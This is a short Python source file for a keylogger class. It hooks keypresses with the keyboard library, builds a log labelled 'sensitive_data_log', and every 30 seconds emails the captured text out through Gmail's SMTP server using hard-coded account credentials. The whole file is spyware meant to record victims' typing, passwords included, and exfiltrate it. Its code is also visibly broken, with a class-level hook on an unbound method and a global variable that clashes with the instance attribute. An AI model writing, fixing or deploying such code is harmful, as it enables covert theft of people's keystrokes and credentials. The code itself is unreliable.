#!/usr/bin/env python
import threading, keyboard, time, smtplib

class KeyLogger:

    def __init__(self, email, email_password):
        self.sensitive_data_log = ""
        self.keyords_not_to_log = ["backspace", "enter", "caps", ""]
        self.keywords_to_change = {"space": " ", "shift": "@"}
        self.junk_log = []
        self.email = email
        self.password = email_password

    def send_email(self, email, password, message):
        self.server = smtplib.SMTP_SSL("smtp.gmail.com")
        self.server.login(email, password)
        self.server.sendmail(email, email, message)
        self.server.quit()

    def log_key(self, log, key):
        log.append(key)

    def key_press(self, key):
        if key.name in self.keyords_not_to_log:
            self.log_key(self.junk_log, key.name)
        elif key.name in self.keywords_to_change:
            new_key = self.keywords_to_change[key.name]
            self.sensitive_data_log = self.sensitive_data_log + new_key
        else:
            self.sensitive_data_log = self.sensitive_data_log + key.name

    keyboard.on_press(key_press)
    def start(self):
        global sensitive_data_log
        while True:
            time.sleep(30.0)
            self.send_email(self.email, self.password, (sensitive_data_log))
            time.sleep(10.0)
            sensitive_data_log = sensitive_data_log.replace(sensitive_data_log, "")
